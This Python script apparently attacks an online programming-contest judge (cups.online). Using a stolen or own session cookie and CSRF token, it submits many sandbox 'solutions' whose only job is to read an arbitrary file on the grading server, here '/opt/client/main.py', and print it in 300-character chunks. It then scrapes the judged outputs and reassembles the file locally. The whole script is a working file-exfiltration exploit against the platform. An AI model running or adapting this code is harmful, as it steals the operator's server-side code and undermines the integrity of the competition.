import time
import requests
import random
from pathlib import Path

SESSION_ID = ':)'
CSRFTOKEN = ':)'
TASK_ID = 1448

LOAD_SIZE = 300


def get_request(url):
    request = requests.get(url,
                           cookies={
                               'sessionid': SESSION_ID
                           })
    time.sleep(1)
    return request


def upload_solution(filename, content):
    form_data = {
        'is_sandbox': (None, 1),
        'language': (None, 1),
        'solution': (filename, content, 'text/plain')
    }
    url = f'https://cups.online/api_v2/task/{TASK_ID}/upload_solution/'

    request = requests.post(url,
                            cookies={
                                'sessionid': SESSION_ID,
                                'csrftoken': CSRFTOKEN
                            },
                            headers={
                                'Referer': f'https://cups.online/ru/workareas/technocup-22/767/{TASK_ID}?is_sandbox=1',
                                'X-CSRFToken': CSRFTOKEN
                            },
                            files=form_data)
    time.sleep(1)
    return request


def get_submission_result(submission_id):
    url = f'https://cups.online/api_v2/solution/{submission_id}/test_results/'
    request = get_request(url)
    return request.json()


def get_submissions(page_size=20):
    url = f'https://cups.online/api_v2/task/{TASK_ID}/uploaded_solutions/?is_sandbox=1&page_size={page_size}'
    request = get_request(url)
    return request.json()


def parse_test(submission):
    result = get_submission_result(submission)[0]['output']
    if len(result) > LOAD_SIZE:
        result = result[:LOAD_SIZE]
    return result


def get_random_file_name(extension='.py'):
    return f'{random.randrange(1, 10 ** 20):020}{extension}'


def get_submission_id(filename):
    submissions = get_submissions()['results']
    for submission in submissions:
        if submission['real_filename'] == filename and submission['state'] == 'Проверено':
            return submission['id']
    return -1


def get_file_size(filename):
    tmp_name = get_random_file_name()
    upload_solution(tmp_name, f'print(len(open("{filename}", "r").read()))')

    submission_id = -1
    while submission_id == -1:
        submission_id = get_submission_id(tmp_name)

    filesize = parse_test(submission_id)
    try:
        filesize = int(filesize)
        return filesize
    except Exception:
        return -1


def download_file(filename):
    print(f'Downloading {filename}')

    write_dir = Path(f'data{filename}')
    if not write_dir.parent.exists():
        Path.mkdir(write_dir.parent, parents=True)

    filesize = get_file_size(filename)
    if filesize == -1:
        print(f'File not found: {filename}')
        return -1

    print(f'File size: {filesize} symbols')
    total_submissions = (filesize + LOAD_SIZE - 1) // LOAD_SIZE
    print(f'Expected submissions: {total_submissions}')

    submissions = [[get_random_file_name(), '\n' * LOAD_SIZE, 0] for _ in range(total_submissions)]

    uploaded_cnt = 0

    while uploaded_cnt < total_submissions:
        results = get_submissions(page_size=50)['results']

        upload_this_iter = True

        for i in range(total_submissions):
            tmp_name, content, submission_id = submissions[i]

            if submission_id > 0:  # uploaded + parsed
                continue
            elif submission_id == 0:  # not uploaded
                if upload_this_iter:
                    r = upload_solution(tmp_name,
                                        f'print(open("{filename}", "r").read()[{i * LOAD_SIZE}:].replace(" ", "§"))')
                    if r.status_code == 200 and r.json()['details'] == 'ok':
                        submissions[i][2] = -1
                    else:
                        upload_this_iter = False
                    print(r.status_code, r.content, r.text)
            else:  # uploaded
                for res in results:
                    if res['real_filename'] == tmp_name:
                        if res['state'] == 'Проверено':
                            submissions[i][2] = res['id']
                            submissions[i][1] = parse_test(res['id']).replace('§', ' ')
                            uploaded_cnt += 1

        print(f'Parsed {uploaded_cnt} of {total_submissions}')
        result = ''
        for tmp_name, content, submission_id in submissions:
            result += content
        with open(write_dir, 'wt') as out:
            print(result, file=out)

    return 0


download_file(f'/opt/client/main.py')
